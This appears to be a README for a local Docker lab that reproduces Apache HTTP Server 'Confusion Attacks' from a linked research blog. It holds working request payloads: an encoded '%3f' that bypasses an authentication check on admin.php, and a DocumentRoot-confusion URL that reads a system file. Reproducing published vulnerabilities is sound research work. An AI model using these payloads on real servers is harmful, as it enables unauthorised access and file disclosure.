# orange-confusion-attacks

Repro for Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server!

https://blog.orange.tw/posts/2024-08-confusion-attacks-en/

## To build and run:

```
docker build -t my-php-website .
docker run -p 80:80 my-php-website
```

## To repro the issues

### Filename Confusion
```
http://127.0.0.1/admin.php => 401
http://127.0.0.1/admin.php%3ftest.php => 200
```

### DocumentRoot Confusion
```
http://127.0.0.1/html/usr/share/doc/hostname/copyright%3f
```
